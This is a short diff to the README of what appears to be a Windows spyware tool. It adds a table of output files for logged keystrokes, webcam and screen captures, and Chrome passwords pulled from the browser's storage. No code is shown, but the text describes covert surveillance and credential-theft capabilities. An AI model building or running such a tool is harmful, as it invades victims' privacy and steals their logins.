@@ -56,3 +56,11 @@ Saves readable credentials to ch_pass.txt.
 
 ⚠️ Works only on Windows, as it accesses system-specific Chrome storage files.
 
+---
+
+## 📂 Output Files
+File Name	Content
+kl.txt	Logged keystrokes
+spycam.png	Captured webcam image
+screenshot.png	Captured screen image
+ch_pass.txt	Extracted Chrome credentials
